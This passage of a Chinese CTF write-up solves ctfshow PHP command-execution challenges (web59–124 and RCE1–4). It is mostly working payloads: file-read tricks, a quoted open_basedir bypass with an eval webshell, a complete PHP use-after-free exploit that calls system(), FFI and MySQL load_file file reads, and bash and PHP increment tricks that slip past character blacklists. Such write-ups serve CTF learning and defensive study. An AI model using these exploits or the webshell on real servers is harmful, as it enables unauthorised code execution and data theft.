}
```

```php
c=show_source('flag.php');
```

## web60

```php
c=show_source('flag.php');
```

## web61

```php
c=show_source('flag.php');
```

## web62

```php
c=show_source('flag.php');
```

## web63

```php
c=show_source('flag.php');
```

## web64

```php
c=show_source('flag.php');
```

## web65

```php
c=show_source('flag.php');
```

## web66

```php
先print_r(scandir('/'));查看根目录有哪些文件，发现flag.txt
再c=highlight_file('/flag.txt');查看文件
```

## web67

```php
禁掉了print_r，改成var_dump，然后和上题一样
```

## web68

```php
highlight_file被禁，那么使用c=include($_POST[1]);&1=php://filter/convert.base64-encode/resource=/flag.txt
拿到flag
```

## web69

```php
c=include($_POST[1]);&1=php://filter/convert.base64-encode/resource=/flag.txt

突然发现好像直接include('/flag.txt');就行了......之前的题目一样
readgzfile('/flag.txt');
var_dump可以用var_export替代
也可以使用下面的方法查看
echo(implode("--",scandir("/")));
```

## web70

```php
include('/flag.txt');
```

## web71

```php
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);//获取输出缓冲区的内容并清空缓冲区，然后使用正则表达式将输出中的数字和字母替换为问号，并将结果输出
}else{
    highlight_file(__FILE__);
}

?>

你要上天吗？
```

```php
我们可以执行php代码让后面的匹配缓冲区不执行直接退出 
payload:c=include('/flag.txt');exit(0);
```

## web72（php伪协议glob://、php垃圾回收）

```php
给出的index.php和上题一样，但是文件不再是flag.txt了，也无法使用var_dump、scandir等函数查看根目录文件，只能查看本目录内容，而flag.php内没有什么东西
```

> 也就是说，本题设置了 open_basedir()，将php所能打开的文件限制在指定的目录树中，包括文件本身。
> 因为 ini_set() 也被限制了，所以 open_basedir() 不能用 ini_set() 重新设置绕过。

> [绕过open_basedir](https://www.freesion.com/article/5349629378/)
>
> # 前言
>
> 从t00ls看到一个可绕过`open_basedir`的php脚本，由于对之了解不是很深，遂有踩坑过程。脚本如下
>
> ```php
> <?php
> @error_reporting(0);
> session_start();
> 
> function bypass_open_basedir(){
>         if(!file_exists('bypass_open_basedir')){
>                 mkdir('bypass_open_basedir');
>         }
>         chdir('bypass_open_basedir');
>         @ini_set('open_basedir','..');
>         @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']);
>         @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
>         @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/') + 1;
>         $_Ei34Ww_sQDfq_i = 0;
>         while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
>                 @chdir('..');
>                 $_Ei34Ww_sQDfq_i++;
>         }
>         @ini_set('open_basedir','/');
>         @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
> }
> bypass_open_basedir();
> // =========== 以下可以是冰蝎马，也可以是一句话。
> if (isset($_GET['pass']))
> {
>     $key=substr(md5(uniqid(rand())),16);
>     $_SESSION['k']=$key;
>     print $key;
> }
> else
> {
>     $key=$_SESSION['k'];
>         $post=file_get_contents("php://input").'';
>         if(!extension_loaded('openssl'))
>         {
>                 $t="base64_"."decode";
>                 $post=$t($post."");
>                 
>                 for($i=0;$i<strlen($post);$i++) {
>                              $post[$i] = $post[$i]^$key[$i+1&15]; 
>                             }
>         }
>         else
>         {
>                 $post=openssl_decrypt($post, "AES128", $key);
>         }
>     $arr=explode('|',$post);
>     $func=$arr[0];
>     $params=$arr[1];
>     @eval($params);
> }
> ?>
> 
> ```
>
> # 问题
>
> ## INI_SET
>
> 1. 函数主体`ini_set`引起我的注意，可以看到在最后函数使用`ini_set`来设置`open_basedir`。这之前的代码并没有特别的操作只是在跳目录，那么这些代码是否能够省略，从而直接通过`ini_set`设置`open_basedir`呢？我进行了尝试发现不可以。问题后面会提。我又想到既然`ini_set`可以设置`php.ini`内的设置项，那么可不可以直接通过脚本来设置`disable_functions`为空从而绕过`disable_functions`的限制呢？我又进行了尝试发现还是不可以，不过在我意料之中。我只能查看官方文档，发现了一些东西：
>
>    ![img](ctfshow%E9%A2%98%E8%A7%A3.assets/8e7b335dd54131a65f1a20905828d931.png)
>
>    果然，不是所有的配置选项都可以通过`ini_set`在脚本中设置。在[附录](https://www.php.net/manual/zh/ini.list.php)中指定了各个配置能够以怎样的方式进行修改。
>
>    ![img](ctfshow%E9%A2%98%E8%A7%A3.assets/b2d386d4d6fd8416108293fbb4ccd615.png)
>
>    `disable_functions`和`open_basedir`可修改的范围分别为`php.ini only`和`PHP_INI_ALL`。`disable_functions`可被修改的范围只能是`php.ini`（之前的不能通过`ini_set`绕过`disable_functions`的困惑解决）。`PHP_INI_ALL`代表的含义如下
>
>    ![img](ctfshow%E9%A2%98%E8%A7%A3.assets/eb0267b06d758bb303e2d5ade4d2329a.png)
>
>    如图，可在任意位置被修改。那么我之前为啥不能修改呢？
>
>    ![img](ctfshow%E9%A2%98%E8%A7%A3.assets/f3afe0a1b1a7c036142478b915675e76.png)
>
>    从官方说明可以看到在脚本内定义的`open_basedir`只能收紧在`php.ini`的配置。而不能拓宽配置。因此我们想要直接设置`open_basedir`为`/`也就无从谈起。
>
> ## OPEN_BASEDIR和CHDIR
>
> 1. 回到一开始为什么脚本里经过一些操作就可以直接`@ini_set('open_basedir','/');`了呢，这就和之前我们的分析相违背了。其实我发现注释掉最后的`@ini_set('open_basedir','/');`并不影响我们能够bypass限制。为啥呢？先知有一篇相关源码分析的[文章](https://xz.aliyun.com/t/4720#toc-1)。这里我直接说一下通俗易懂的理解。我们刚才分析说
>
>    > 从官方说明可以看到在脚本内定义的`open_basedir`只能收紧在`php.ini`的配置。而不能拓宽配置。
>
>    也可以理解为只能限制在本文件夹下，而我们`ls -a`可以看到`..`也存在于本文件夹下。
>
>    ![img](ctfshow%E9%A2%98%E8%A7%A3.assets/ed36eceaa191b4db879e6d460510b125.png)
>
>    就可以通过`ini_set`设置`open_basedir`为`..`。也因此我们可以通过`chdir`进入这个目录（上一级目录）如此循环直至`/`。其实不必获取路径再计算要跳目录的次数，直接跳就完了，和文件包含有点像，跳足够多就一定回到根目录。此时我们想要读取某一文件。php得到`open_basedir`为`..`(跳目录次数足够多即为根目录)，可直接读取到。
>
> 2. 我们可以做一个特殊的实验。我当前路径为`/var/www/html`。`open_basedir`设置为`/var/www/html`。bypass函数如下
>
>    ```php
>    function bypass_open_basedir(){
>    if(!file_exists('bypass_open_basedir')){
>                    mkdir('bypass_open_basedir');
>            }
>            chdir('bypass_open_basedir');
>            @ini_set('open_basedir','..');
>            //echo @ini_get("open_basedir");
>            @$_Ei34Ww_sQDfq_FILENAME = dirname($_SERVER['SCRIPT_FILENAME']);
>            // echo $_Ei34Ww_sQDfq_FILENAME;
>            @$_Ei34Ww_sQDfq_path = str_replace("\\",'/',$_Ei34Ww_sQDfq_FILENAME);
>            @$_Ei34Ww_sQDfq_num = substr_count($_Ei34Ww_sQDfq_path,'/')-1;
>            //echo $_Ei34Ww_sQDfq_num;
>            $_Ei34Ww_sQDfq_i = 0;
>            while($_Ei34Ww_sQDfq_i < $_Ei34Ww_sQDfq_num){
>                    @chdir('..');
>                    $_Ei34Ww_sQDfq_i++;
>            }
>    //@ini_set('open_basedir','/');
>    @rmdir($_Ei34Ww_sQDfq_FILENAME.'/'.'bypass_open_basedir');
>    }
>    1234567891011121314151617181920
>    ```
>
>    只跳两次目录，当前的目录为`www`,`open_basedir`为`..`即`var`。此时我们应该无法查看其他目录。
>
>    ![在这里插入图片描述](ctfshow%E9%A2%98%E8%A7%A3.assets/467e9049032a29bc4281ee3d828c4339.png)

```php
题目给出的hint:
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0); ?>
//注意空格
//通过这个发现flag在flag0.txt
//之后利用uaf的脚本进行命令执行
```

```php
<?php
$a=new DirectoryIterator("glob:///*");
	# 利用DirectoryIterator($path)可以实现遍历目录下的所有文件
	# glob://  查找匹配的文件路径模式
	# DirectoryIterator("glob:///*")   遍历根目录里所有文件
foreach($a as $f){  	#循环遍历输出，并以空格为分隔
    echo ($f->__tostring().' ');
}
exit(0);
?>
```

![在这里插入图片描述](ctfshow%E9%A2%98%E8%A7%A3.assets/56cde5e920c7481aacbda718741b1529.png)

```php
其实不加前面?><?php也是可以的。eval里的语句可以视为在当前php文件里加了几条语句，这些语句必须是完整的，即必须以;或者?>结尾来结束语句，但是eval里的?>不会闭合当前的php文件，所以当前php页面后续的语句都是会执行的。

可以看一下下面的图片，eval里的语句可以修改文件的变量值，但是?>并不会闭合外面的PHP语句。
```

![在这里插入图片描述](ctfshow%E9%A2%98%E8%A7%A3.assets/4a3e6e03ecae4326b01bfa7e16d1fbab.png)

```php
接下来是ctfshow 提供的这道题的poc（一个绕过安全目录的脚本）：说是利用了 php的垃圾回收，代码啃了一部分后面实在啃不动了，涉及到偏移地址之类的，那些数值不知道具体指向。（以后再研究吧）

这个脚本一般情况过下应该是可以直接使用，要求被攻击服务器必须是类unix系统，没有什么容易被过滤的函数，可能会被过滤的strlen()在脚本中也只是起到判断作用，可以调整修改的。
```

```php
<?php
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { 

                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {

        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }


    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");ob_end_flush();
?>
```

## web73

```php
这题可以使用scandir查看根目录的文件，发现flagc.txt
c=include('/flagc.txt');exit(0);得到flag
```

## web74

```php
c=var_export(scandir('/'));exit(0);
发现回显NULL
改为使用
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0);
得到根目录文件
c=include('/flagx.txt');exit(0);
得到flag
```

## web75

```php
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0);
得到flag36.txt，但是include无法打开，hint里给的代码如下：

//还是一样通过glob协议找到文件为flag36.txt，但是include限制文件夹，之前的uaf poc因为strlen被禁了获取不到system地址也没法用了，但是既然php受限制，那么mysql的load_file函数呢
    
try {
	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
	# 在MySQL中,load_file(完整路径)函数读取一个文件并将其内容作为字符串返回。
	foreach($dbh->query('select load_file("/flag36.txt")') as $row)
	{
		echo($row[0])."|"; 
	}
	$dbh = null;
}catch (PDOException $e) {
	echo $e->getMessage();
    exit(0);
}
exit(0);

```

## web76

```php
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0);
发现flag36d.txt
try {
	$dbh = new PDO('mysql:host=localhost;dbname=ctftraining', 'root','root');
	foreach($dbh->query('select load_file("/flag36d.txt")') as $row)
	{
		echo($row[0])."|"; 
	}
	$dbh = null;
}catch (PDOException $e) {
	echo $e->getMessage();
    exit(0);
}
exit(0);
```

## web77

```php
c=?><?php $a=new DirectoryIterator("glob:///*"); foreach($a as $f) {echo($f->__toString().' ');} exit(0);
发现flag36x.txt
然后看hint，这题要用php7.4版本以上才有的FFI
$ffi = FFI::cdef("int system(const char *command);");//创建一个system对象
$a='/readflag > 1.txt'; //没有回显的
$ffi->system($a); //通过$ffi去调用system函数
再通过readgzfile('1.txt');exit(0);读取flag
```

## web118

先用脚本来查看白名单

```py
import requests
import string
url = "https://befab4fa-c3ab-45ca-a166-461ccfc289d3.challenge.ctf.show/"
list = string.ascii_letters + string.digits + "$+-}{_><:?*.~/\\ "
white_list = ""
for payload in list:
    data = {
        "code" : payload
    }
    res = requests.post(url,data=data)
    if "evil input" not in res.text:
        print(payload)
        white_list += payload
print(white_list.replace(" ","空格"))


# ABCDEFGHIJKLMNOPQRSTUVWXYZ$}{_:?.~空格
```

思路为使用环境变量进行拼接

```php
# echo ${PWD} 
/root

# echo ${PWD:0:1}      #表示从0下标开始的第一个字符
/           

# echo ${PWD:~0:1}      #从结尾开始往前的第一个字符
t

# echo ${PWD:~0}      
t

# echo ${PWD:~A}       #所以字母和0具有同样作用             
t

# echo ${PATH}                            
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

$PWD和${PWD}    表示当前所在的目录	/var/www/html
${#PWD}         13		前面加个#表示当前目录字符串长度
${PWD:3}        r/www/html	代表从第几位开始截取到后面的所有字符（从零开始）
${PWD:~3}    	html	代表从最后面开始向前截取几位（从零开始）
${PWD:3:1}     	r
${PWD:~3:1} 	h
${PWD:~A}		l	这里的A其实就是表示1
${SHLVL:~A} 	1	代表数字1

    
所以${PATH:~A}${PWD:~A}为nl（当前目录为/var/www/html，最后一个字母为l）

POC:
${PATH:~A}${PWD:~A} ????????
```

## web119

在上题的基础上将PATH过滤掉了，白名单不变

```php
可以尝试构造/bin/base64 flag.php这个命令，只需要得到/和4即可，其他用?替代
    
/可以使用${PWD::1}得到，由于1被禁，所以用${SHLVL}替代
${PWD::${SHLVL}}

然后就是4，可以使用RANDOM
RANDOM是一个变量值，随机出现整数，范围为：0~32767
虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样
如果需要每次产生的随机数顺序不一样的话，可以在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子

回到构造 4 这个字符上，再Linux中，${#xxx}显示的是这个数值的位数，而如果不加 # 的话就是显示这个数原本的值，比如12345再加上#后就是5
在RANDOM中产生的随机数可以是1、2、3、4、5这个5个数，但1，2，3这三个出现的概率很低，所以基本上是4或5，因此如果要使用RANDOM的话其实也有碰运气的成分在里面，没准就撞到了正确的数

POC:
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
多试几次后得到flag

补充：
1：${#SHLVL}=1，或者${##}、${#?}。

2：${SHLVL}=2 （SHLVL是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$SHLVL=1，然后在此shell中再打开一个shell时$SHLVL=2。）

3：${#IFS}=3。（linux下是3，mac里是4）
```

## web120

```php

<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}
白名单：
ABCDEFGHIJKLMNOPQRSTUVWXYZ$}{_:?.~空格
```

思路依旧是环境变量

```php
code=${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???
```

## web121

```php

<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}
这题将SHLVL禁掉了，只能另寻他法，可以使用${#RANDOM}获取4来进行/bin/base64 flag.php的执行
POC:
code=${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???

或者
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
构造的是/bin/rev
```

## web122

```php

<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

将PWD禁掉了，但是没禁HOME
hint:
通过$?来实现的，$?是表示上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误，构造错误命令，使$?的结果为1，代替${##}来分割，可以用命令<A然后下一条命令中的$?就等价于1了

payload:code=<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
#可能存在成功的机会，不断刷新
```

## web124

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

```php
这题只能使用一些数学函数，字符白名单如下：
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-}{_><:?*.~/\空格
对于括号类的字符：
圆括号和方括号都是能用花括号直接替换的

_GET的构造：
因为这里很多数学函数都没有被禁，所以肯定是从这个入手的
base_convert('hex2bin', 36, 10);
即将hex2bin这个字符串从36进制转换成10进制，结果：37907361743
hexdec(bin2hex("_GET"));
即将_GET这个字符串转换成16进制后再转换成10进制，结果：1598506324
最后_GET的整体构造为：
base_convert('37907361743',10,36)(dechex('1598506324'));
POC:
c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi{abs}($$pi{acos})&abs=system&acos=cat f*

```



# 每周大挑战

## RCE1

```php
<?php

error_reporting(0);
highlight_file(__FILE__);

$code = $_POST['code'];

$code = str_replace("(","括号",$code);

$code = str_replace(".","点",$code);

eval($code);

?>
```

```php
code=echo `ls /`;
code=echo `tac /f1agaaa`;
```

## RCE2（自增绕过）

```php
<?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow)) {
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?>
构造出来$_GET[_]($_GET[__]);然后直接命令执行即可，采用自增绕过
```

```php
$_=''.[];
$_=$_['_'];
$_++;
$_++;
$_++;
$__=++$_;
$_++;
$___=++$_;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_++;
$_=_.$___.$__.$_;
$$_[_]($$_[__]);
```

```php
注意post用url编码后使用。
get：?_=system&__=cat /f*;
```

```php
在写这题时，使用了在学习PHP命令执行自增绕过时的脚本，得到的是，但无结果，后面发现可能是不能在一个参数中将命令全部拼接起来，而是要多个参数，比如上面的?_=system&__=cat /f*;
```



## RCE3

```php
<?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 105) {
        if (!preg_match("/[a-zA-Z2-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?>

```

由于做了很多正则匹配，所以利用一个脚本来查看哪些字符可以使用

```php
for ($i=32;$i<127;$i++){
        if (!preg_match("/[a-zA-Z2-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",chr($i))){
            echo chr($i)." ";
        }
}

//post可传入的字符如下
//  0 $ 1 ( ) + , . / ; = [ ] _ 
```

```
从题目可以看出post传参被正则限制的厉害，想着同时进行get传参，但是限制了post参数长度(<=105)。使非数字绕过，_/_非法运算时返回NAN，通过变量自增，组装$*POST[*]，以便达到post传参，执行远程命令。
```

![img](ctfshow%E9%A2%98%E8%A7%A3.assets/12cfcc928d7e41d9ac3ea67f8e8a8b25.png)

![img](ctfshow%E9%A2%98%E8%A7%A3.assets/b1ab92f57e604920b26d97014c59b706.png)

![img](ctfshow%E9%A2%98%E8%A7%A3.assets/c85ea9e2bc9e4dc1b2a47510a610ad7c.png)

注意：之前好奇为啥 $d1 =
‘ab’.‘cd’[0]，输出值为"abc"，这里涉及到运算优先级问题，‘cd’[0]的值为"c"，再和前面的’ab’拼接后，即"abc"。

```php
$_=(_/_._)[0];  //$_变量的值为"NAN_"[0]的值，即值为"N"
$_0=++$_;       //$_变量自增后，值为"O",且再赋值给变量$_0，且其值为"O"
$_0=++$_.$_0;   //$_变量增增后，值为"P",再拼接变量$_0的值"O",再赋值给变量$_0,即值为"PO"
++$_;++$_;      //$_变量增增后，值为"Q"、"R"
$_0.=++$_;      //变量$_0变量的值为"PO",再拼接$_变量增增后的值"S"，再赋值给变量$_0,即值为"POS"
$_0.=++$_;      //变量$_0变量的值为"POS",再拼接$_变量增增后的值"T"，再赋值给变量$_0,即值为"POST"
$_=_.$_0;       //变量$_重新赋值为"_"拼接变量$_0的值"POST",即值为"_POST"
$$_[0]($$_[1]); //替换$_0变量的值"_POST"后，即组装出 $_POST[0]($_POST[1])，以便post传参，参数名为0和1，如0参数传参为system，1参数传参为ls /，即post传参后拼接出system('ls /')命令，以便eval去执行。


//post传参，注意在&0=system&1=ls /之前的要用url编码，要不然+号会被识别为空格
ctf_show=$_=(_/_._)[0];$_0=++$_;$_0=++$_.$_0;++$_;++$_;$_0.=++$_;$_0.=++$_;$_=_.$_0;$$_[0]($$_[1]);&0=system&1=ls /
然后再cat /f1agaaa
```

另一种自增：

```php

$a=(0/0);//NAN
$a.=_;//NAN_
$a=$a[0];//N
$a++;//O
$o=$a++;//$o=$a++是先把$a的值给$o,然后再对$a进行自增，所以这一句结束的时候 $a是P，$o是O
$p=$a++;//$a=>Q,$p=>P
$a++;$a++;//R
$s=$a++;//S
$t=$a;//T
$_=_;//_
$_.=$p.$o.$s.$t;//_POST
$$_[0]($$_[1]);//$_POST[0]($_POST[1]);
```

```php
用burp把a换成不可见字符（如%ff %fe等），url编码中+会被替换成空格，所以要换成%2b（由于不可见字符的原因，所以不能用hackbar来做，而是使用bp）
```

```php
ctf_show=$%ff=(0/0);$%ff.=_;$%ff=$%ff[0];$%ff%2b%2b;$%fd=$%ff%2b%2b;$%fe=$%ff%2b%2b;$%ff%2b%2b;$%ff%2b%2b;$%fc=$%ff%2b%2b;$%fb=$%ff;$_=_;$_.=$%fe.$%fd.$%fc.$%fb;$$_[0]($$_[1]);&0=system&1=cat /f1agaaa
```

## RCE4

```php
<?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow) && strlen($ctfshow) <= 84) {
        if (!preg_match("/[a-zA-Z1-9!'@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
